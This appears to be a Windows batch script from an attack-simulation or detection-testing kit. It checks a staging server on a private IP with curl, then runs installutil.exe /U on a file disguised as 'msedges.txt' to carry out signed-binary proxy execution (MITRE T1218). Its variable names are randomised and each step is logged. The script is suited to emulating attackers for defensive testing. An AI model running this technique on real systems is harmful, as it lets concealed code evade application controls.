@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8044\b9d3eee2
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8044-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=msedges.txt
SET ewjmdkff=8044

REM Internal variables
SET logfile=%APPDATA%\!pudaazx!\macula-simulations.log
SET tempdir=%APPDATA%\!pudaazx!
SET uninetexec=installutil.exe

REM Create directory for logfile if it doesn't exist
if not exist "!tempdir!\" mkdir "!tempdir!" >nul 2>&1

REM Check for installutil.exe in both Framework and Framework64 directories
if exist "%windir%\Microsoft.NET\Framework64\v4.0.30319\installutil.exe" (
    SET installutilpath=%windir%\Microsoft.NET\Framework64\v4.0.30319\!uninetexec!
) else if exist "%windir%\Microsoft.NET\Framework\v4.0.30319\installutil.exe" (
    SET installutilpath=%windir%\Microsoft.NET\Framework\v4.0.30319\!uninetexec!
) else (
    echo [!DATE! !TIME!][ERROR][!hlbnp!]: installutil.exe not found>> "!logfile!" 2>&1
    exit /b 1
)

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start=checking_!drguvr!>> "!logfile!" 2>&1
curl --version >nul 2>&1
if errorlevel 1 (
    echo [!DATE! !TIME!][ERROR][!hlbnp!]: curl.exe not found in PATH>> "!logfile!" 2>&1
    exit /b 1
)
curl -k -s -o NUL "!drguvr!" 2>&1
if errorlevel 1 (
    SET ttp_result=0
    SET ttp_error=connection_failed
    SET ttp_date=!DATE:/=-!
    SET ttp_time=!TIME:~0,8!.000
    echo [!ttp_date! !ttp_time!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=[!ttp_result!]:[!ttp_error!] >> "!logfile!" 2>&1
    exit /b
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=success>> "!logfile!" 2>&1

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>> "!logfile!" 2>&1
if not exist "!pjkcpgw!\" (
    mkdir "!pjkcpgw!" >nul 2>&1
    if errorlevel 1 (
        SET ttp_result=0
        SET ttp_error=directory_creation_failed
        SET ttp_date=!DATE:/=-!
        SET ttp_time=!TIME:~0,8!.000
        echo [!ttp_date! !ttp_time!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=[!ttp_result!]:[!ttp_error!] >> "!logfile!" 2>&1
        exit /b
    )
)
cd /d "!pjkcpgw!" 2>&1
if errorlevel 1 (
    SET ttp_result=0
    SET ttp_error=directory_not_found
    SET ttp_date=!DATE:/=-!
    SET ttp_time=!TIME:~0,8!.000
    echo [!ttp_date! !ttp_time!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=[!ttp_result!]:[!ttp_error!] >> "!logfile!" 2>&1
    exit /b
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_complete=success>> "!logfile!" 2>&1

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_start=!installutilpath!>> "!logfile!" 2>&1
if not exist "!syjfr!" (
    SET ttp_result=0
    SET ttp_error=target_file_not_found
    SET ttp_date=!DATE:/=-!
    SET ttp_time=!TIME:~0,8!.000
    echo [!ttp_date! !ttp_time!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=[!ttp_result!]:[!ttp_error!] >> "!logfile!" 2>&1
    exit /b
)
"!installutilpath!" /U "!syjfr!" /LogToConsole=false 2>&1
if errorlevel 1 (
    SET ttp_result=0
    SET ttp_error=execution_failed
    SET ttp_date=!DATE:/=-!
    SET ttp_time=!TIME:~0,8!.000
    echo [!ttp_date! !ttp_time!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=[!ttp_result!]:[!ttp_error!] >> "!logfile!" 2>&1
    exit /b
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_complete=success>> "!logfile!" 2>&1

SET ttp_result=1
SET ttp_error=
SET ttp_date=!DATE:/=-!
SET ttp_time=!TIME:~0,8!.000
echo [!ttp_date! !ttp_time!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=[!ttp_result!]:[!ttp_error!] >> "!logfile!" 2>&1

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: dll_load_complete=!syjfr!>> "!logfile!" 2>&1